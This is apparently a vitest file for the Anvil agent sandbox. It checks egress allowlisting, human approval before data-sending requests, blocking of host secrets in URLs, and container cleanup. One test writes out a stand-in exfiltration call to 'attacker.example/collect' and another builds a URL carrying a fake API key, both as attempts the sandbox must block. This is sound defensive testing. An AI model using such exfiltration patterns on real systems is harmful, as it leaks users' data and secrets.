import http from "node:http";
import { spawnSync } from "node:child_process";
import type { AddressInfo } from "node:net";
import { z } from "zod";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { NodeClass } from "../src/core/registry.js";
import { runProgram } from "../src/core/tools/codeBridge.js";
import type { AgentSpec, RunEvent } from "../src/core/types.js";
import { createAnvil } from "../src/runtime/anvil.js";
import { anvilWith, FakeClient } from "./helpers.js";

const image = spawnSync("docker", ["image", "inspect", "anvil-sandbox:py312"], { stdio: "ignore" }).status === 0;

/** A local site: one page, and an endpoint that records the bodies it gets. */
let server: http.Server;
let base = "";
const hits: { path: string; method: string; body: string }[] = [];
beforeAll(async () => {
  server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      hits.push({ path: req.url ?? "", method: req.method ?? "", body });
      res.writeHead(200, { "Content-Type": "application/json" }).end(JSON.stringify({ path: req.url, n: 42 }));
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});
afterAll(() => server.close());

/** A test node class that runs the program in its config with runProgram. */
const ProgramNode: NodeClass<{ code: string; tools: string[] }> = {
  type: "test_program",
  title: "Test program",
  category: "tool",
  description: "Runs a Python program in the sandbox (test only).",
  whenToUse: "Tests.",
  configSchema: z.object({ code: z.string(), tools: z.array(z.string()).default([]) }),
  example: { code: "from anvil import result\nresult(1)", tools: [] },
  async execute(ctx) {
    const r = await runProgram(ctx, ctx.config.code, { tools: ctx.config.tools });
    return { output: { ok: r.ok, result: r.result, error: r.error, egress: r.egress } };
  },
};

const spec = (code: string, tools: string[], allowDomains: string[] = ["127.0.0.1"]): AgentSpec => ({
  specVersion: "anvil/v1",
  id: "p",
  name: "p",
  description: "",
  version: 1,
  inputSchema: { type: "object", properties: {} },
  nodes: [
    { id: "input", type: "input", config: {} },
    { id: "prog", type: "test_program", config: { code, tools } },
    { id: "output", type: "output", config: { value: "{{nodes.prog.output}}" } },
  ],
  edges: [
    { from: "input", to: "prog" },
    { from: "prog", to: "output" },
  ],
  policy: { maxCostUsd: 1, maxNodeExecutions: 20, timeoutMs: 120_000, requireApprovalForSideEffects: false, sandbox: { allowDomains } },
  tests: [],
  meta: {},
});

const setup = async () => {
  const anvil = await anvilWith(new FakeClient());
  anvil.registry.register(ProgramNode as NodeClass);
  return anvil;
};
type Out = { ok: boolean; result: unknown; error: string | null; egress: { decision: string; host: string; reason?: string }[] };
const egressEvents = (events: RunEvent[]) => events.filter((e) => e.type === "artifact" && e.kind === "egress").map((e) => (e as { data: { decision: string } }).data.decision);
/** The containers of one manager (its owner label). */
const containersOf = (owner: string) =>
  spawnSync("docker", ["ps", "-aq", "--filter", `label=anvil.sandbox.owner=${owner}`])
    .stdout.toString()
    .split(/\s+/)
    .filter(Boolean).length;

describe.skipIf(!image)("tool bridge (real Docker)", () => {
  it("a program calls an allowed tool, and the call goes through the egress policy", async () => {
    const anvil = await setup();
    const r = await anvil.runs.run({ spec: spec(`from anvil import tools, result\nresult(tools.fetch_url(url="${base}/page")["text"])`, ["fetch_url"]) }, {});
    const out = r.output as Out;
    expect(out.ok).toBe(true);
    expect(String(out.result)).toContain('"n":42');
    expect(egressEvents(r.events)).toEqual(["allowed"]);
    expect(r.events.some((e) => e.type === "artifact" && e.kind === "code")).toBe(true);
    await anvil.sandbox.close();
  }, 120_000);

  it("blocks a domain that is not on the allowlist, and the program sees why", async () => {
    const anvil = await setup();
    const code = `from anvil import tools, result, ToolError\ntry:\n    tools.fetch_url(url="https://attacker.example/collect?d=x")\nexcept ToolError as e:\n    result(str(e))`;
    const r = await anvil.runs.run({ spec: spec(code, ["fetch_url"]) }, {});
    expect(String((r.output as Out).result)).toMatch(/Blocked by the egress policy: the domain attacker.example is not on the allowlist/);
    expect(egressEvents(r.events)).toEqual(["blocked"]);
    await anvil.sandbox.close();
  }, 120_000);

  it("rejects a tool that the program may not use", async () => {
    const anvil = await setup();
    const code = `from anvil import tools, result, ToolError\ntry:\n    tools.http_request(url="${base}/x", method="GET")\nexcept ToolError as e:\n    result(str(e))`;
    const r = await anvil.runs.run({ spec: spec(code, ["fetch_url"]) }, {});
    expect(String((r.output as Out).result)).toMatch(/The tool "http_request" is not available to this program. Available tools: fetch_url/);
    await anvil.sandbox.close();
  }, 120_000);

  it("asks a person before a request that sends data", async () => {
    const anvil = await setup();
    hits.length = 0;
    const code = `from anvil import tools, result\nresult(tools.http_request(url="${base}/items", method="POST", body={"name": "x"})["status"])`;
    const started = anvil.runs.start({ spec: spec(code, ["http_request"]) }, {});
    for (let i = 0; i < 600 && !anvil.runs.pendingRequests(started.id).length; i++) await new Promise((r) => setTimeout(r, 50));
    const req = anvil.runs.pendingRequests(started.id)[0];
    expect(req.request).toMatchObject({ kind: "approval", title: "A program wants to send data" });
    expect(hits.filter((h) => h.method === "POST")).toHaveLength(0); // nothing went out before the approval
    anvil.runs.resume(started.id, req.nodeId, { approved: true });
    const done = await anvil.runs.waitForRun(started.id);
    expect((done?.output as Out).result).toBe(200);
    expect(hits.find((h) => h.method === "POST")?.body).toBe('{"name":"x"}');
    expect(egressEvents(done!.events)).toEqual(["approved"]);
    await anvil.sandbox.close();
  }, 120_000);

  it("never sends data out in an evaluation run", async () => {
    const anvil = await setup();
    hits.length = 0;
    const code = `from anvil import tools, result, ToolError\ntry:\n    tools.http_request(url="${base}/items", method="POST", body={"a": 1})\nexcept ToolError as e:\n    result(str(e))`;
    const r = await anvil.runs.run({ spec: spec(code, ["http_request"]) }, {}, { kind: "eval", humanMode: "auto" });
    expect(String((r.output as Out).result)).toMatch(/Evaluation runs and dry runs never send data out/);
    expect(hits).toHaveLength(0);
    await anvil.sandbox.close();
  }, 120_000);

  it("blocks a request with a secret of the host", async () => {
    process.env.TEST_SANDBOX_API_KEY = "very-secret-value-0123456789";
    const anvil = await setup();
    hits.length = 0;
    const code = `from anvil import tools, result, ToolError\ntry:\n    tools.fetch_url(url="${base}/?k=very-secret-value-0123456789")\nexcept ToolError as e:\n    result(str(e))`;
    const r = await anvil.runs.run({ spec: spec(code, ["fetch_url"]) }, {});
    expect(String((r.output as Out).result)).toMatch(/the request contains a secret of the Anvil host/);
    expect(hits).toHaveLength(0);
    delete process.env.TEST_SANDBOX_API_KEY;
    await anvil.sandbox.close();
  }, 120_000);

  it("calls a tested class of the library, and repeats a call only one time", async () => {
    const anvil = await setup();
    await anvil.classes.save(
      {
        type: "x_double",
        title: "Double",
        category: "data",
        description: "Doubles a number.",
        whenToUse: "Tests.",
        configSchema: { type: "object", properties: { n: { type: "number" } }, required: ["n"] },
        outputSchema: { type: "object", properties: { v: { type: "number" } } },
        impl: { kind: "code", code: "return { v: config.n * 2 }" },
        tests: [{ name: "t", config: { n: 2 }, checks: [{ path: "v", op: "equals", value: 4 }] }],
      },
      { brain: anvil.runs.brain },
    );
    hits.length = 0;
    const code = `from anvil import tools, classes, result\na = tools.fetch_url(url="${base}/same")\nb = tools.fetch_url(url="${base}/same")\nresult({"v": classes.x_double(n=21)["v"], "same": a == b})`;
    const r = await anvil.runs.run({ spec: spec(code, ["fetch_url"]) }, {});
    expect((r.output as Out).result).toEqual({ v: 42, same: true });
    expect(hits.filter((h) => h.path === "/same")).toHaveLength(1);
    await anvil.sandbox.close();
  }, 120_000);

  it("allowlist mode: the program contacts an allowed domain directly, and the proxy blocks other domains", async () => {
    const client = new FakeClient();
    const anvil = await createAnvil({ client, config: { dataDir: client.config.dataDir, sandbox: { ...client.config.sandbox, network: "allowlist" } } });
    anvil.registry.register(ProgramNode as NodeClass);
    try {
      const code = `import urllib.request
from anvil import result
out = {}
for url in ["https://pypi.org/simple/six/", "https://example.com/"]:
    try:
        out[url] = urllib.request.urlopen(url, timeout=20).status
    except Exception as e:
        out[url] = str(e)[:120]
result(out)`;
      const r = await anvil.runs.run({ spec: spec(code, [], ["pypi.org"]) }, {});
      const res = (r.output as Out).result as Record<string, unknown>;
      expect(res["https://pypi.org/simple/six/"]).toBe(200);
      expect(String(res["https://example.com/"])).toMatch(/403|Tunnel connection failed/);
      const direct = r.events.filter((e) => e.type === "artifact" && e.kind === "egress").map((e) => (e as { data: { tool: string; host: string; decision: string } }).data);
      expect(direct).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ tool: "direct", host: "pypi.org", decision: "allowed" }),
          expect.objectContaining({ tool: "direct", host: "example.com", decision: "blocked" }),
        ]),
      );
    } finally {
      await anvil.sandbox.dispose();
    }
  }, 180_000);

  it("removes the container when the run ends, and close() leaves no container", async () => {
    const anvil = await setup();
    const r = await anvil.runs.run({ spec: spec("from anvil import result\nresult(1)", []) }, {});
    expect((r.output as Out).result).toBe(1);
    const code = r.events.find((e) => e.type === "artifact" && e.kind === "code") as { data: { container: string } };
    const left = spawnSync("docker", ["ps", "-aq", "--filter", `name=${code.data.container}`])
      .stdout.toString()
      .trim();
    expect(left).toBe("");
    const owner = (anvil.sandbox as unknown as { owner: string }).owner;
    await anvil.sandbox.close();
    expect(containersOf(owner)).toBe(0);
  }, 120_000);
});
